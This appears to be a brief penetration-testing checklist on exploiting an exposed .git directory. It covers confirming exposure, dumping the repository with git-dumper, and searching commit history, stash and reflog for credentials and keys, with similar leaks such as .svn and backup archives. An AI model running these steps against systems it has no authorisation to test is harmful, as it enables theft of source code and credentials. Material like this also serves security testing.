title: Git Leak Exploitation
description: Recover source code and historical credentials from an exposed .git directory
detail:
Confirmation: /.git/HEAD returns 200.
Full recovery: git-dumper http://T/.git/ dest (or githacker).
Investigation:
1. git log --all --oneline; git diff HEAD^; deleted commits often contain sensitive files/keys/debug endpoints
2. git log -p to search all history for credentials
3. Recover stash/reflog
Apply the same approach to other leaks: .svn, .DS_Store, swagger.json endpoint inventory, backup archives (www.zip backup.zip).
